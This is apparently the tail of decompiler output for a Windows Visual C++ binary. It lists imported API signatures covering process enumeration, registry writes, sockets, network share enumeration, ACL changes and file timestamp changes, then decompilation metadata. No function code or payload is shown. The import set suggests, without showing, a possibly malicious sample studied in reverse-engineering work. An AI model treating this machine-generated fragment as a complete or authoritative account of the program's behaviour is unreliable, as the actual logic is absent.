// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// LANGID GetSystemDefaultLangID(void);
// BOOL GetTokenInformation(_In_ HANDLE TokenHandle, _In_ TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, _In_ DWORD TokenInformationLength, _Out_ PDWORD ReturnLength);
// BOOL GetUserNameA(LPSTR lpBuffer, _Inout_ LPDWORD pcbBuffer);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExA(_Inout_ LPOSVERSIONINFOA lpVersionInformation);
// BOOL GetVolumeInformationA(_In_opt_ LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, _In_ DWORD nVolumeNameSize, _Out_opt_ LPDWORD lpVolumeSerialNumber, _Out_opt_ LPDWORD lpMaximumComponentLength, _Out_opt_ LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, _In_ DWORD nFileSystemNameSize);
// UINT GetWindowsDirectoryA(LPSTR lpBuffer, _In_ UINT uSize);
// HGLOBAL GlobalAlloc(_In_ UINT uFlags, _In_ SIZE_T dwBytes);
// HGLOBAL GlobalFree(HGLOBAL hMem);
// u_short htons(_In_ u_short hostshort);
// unsigned long inet_addr(_In_z_ const char * cp);
// char * inet_ntoa(_In_ struct in_addr in);
// int ioctlsocket(_In_ SOCKET s, _In_ long cmd, _Inout_ u_long * argp);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// HLOCAL LocalFree(HLOCAL hMem);
// BOOL LookupAccountSidA(_In_opt_ LPCSTR lpSystemName, _In_ PSID Sid, LPSTR Name, _Inout_ LPDWORD cchName, LPSTR ReferencedDomainName, _Inout_ LPDWORD cchReferencedDomainName, _Out_ PSID_NAME_USE peUse);
// BOOL LookupPrivilegeValueA(_In_opt_ LPCSTR lpSystemName, _In_ LPCSTR lpName, _Out_ PLUID lpLuid);
// int lstrcmpiA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// void * malloc(size_t size);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memset(void * s, int c, size_t n);
// int MultiByteToWideChar(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCCH lpMultiByteStr, _In_ int cbMultiByte, LPWSTR lpWideCharStr, _In_ int cchWideChar);
// HANDLE OpenMutexA(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCSTR lpName);
// HANDLE OpenProcess(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);
// BOOL OpenProcessToken(_In_ HANDLE ProcessHandle, _In_ DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// int rand(void);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegDeleteValueA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName);
// LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// LSTATUS RegQueryValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, LPDWORD lpReserved, _Out_opt_ LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// int select(_In_ int nfds, _Inout_opt_ fd_set * readfds, _Inout_opt_ fd_set * writefds, _Inout_opt_ fd_set * exceptfds, _In_opt_ const struct timeval * timeout);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// DWORD SetEntriesInAclA(_In_ ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_A pListOfExplicitEntries, _In_opt_ PACL OldAcl, _Out_ PACL * NewAcl);
// BOOL SetEvent(_In_ HANDLE hEvent);
// BOOL SetFileAttributesA(_In_ LPCSTR lpFileName, _In_ DWORD dwFileAttributes);
// BOOL SetFileTime(_In_ HANDLE hFile, _In_opt_ const FILETIME * lpCreationTime, _In_opt_ const FILETIME * lpLastAccessTime, _In_opt_ const FILETIME * lpLastWriteTime);
// DWORD SetSecurityInfo(_In_ HANDLE handle, _In_ SE_OBJECT_TYPE ObjectType, _In_ SECURITY_INFORMATION SecurityInfo, _In_opt_ PSID psidOwner, _In_opt_ PSID psidGroup, _In_opt_ PACL pDacl, _In_opt_ PACL pSacl);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// int sprintf(char * restrict s, const char * restrict format, ...);
// void srand(unsigned int seed);
// char * strcat(char * restrict dest, const char * restrict src);
// char * strchr(char * s, int c);
// int strcmp(const char * s1, const char * s2);
// char * strcpy(char * restrict dest, const char * restrict src);
// size_t strlen(const char * s);
// char * strrchr(char * s, int c);
// char * strstr(char * haystack, const char * needle);
// int swprintf(wchar_t * restrict s, size_t n, const wchar_t * restrict format, ...);
// time_t time(time_t * timer);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// DWORD WNetCloseEnum(_In_ HANDLE hEnum);
// DWORD WNetEnumResourceA(_In_ HANDLE hEnum, _Inout_ LPDWORD lpcCount, LPVOID lpBuffer, _Inout_ LPDWORD lpBufferSize);
// DWORD WNetOpenEnumA(_In_ DWORD dwScope, _In_ DWORD dwType, _In_ DWORD dwUsage, _In_opt_ LPNETRESOURCEA lpNetResource, _Out_ LPHANDLE lphEnum);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int WSACleanup(void);
// int WSAGetLastError(void);
// int WSAStartup(_In_ WORD wVersionRequested, _Out_ LPWSADATA lpWSAData);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (6.0)
// Detected language: Visual C++
// Detected functions: 88
// Decompilation date: 2017-12-16 01:29:35
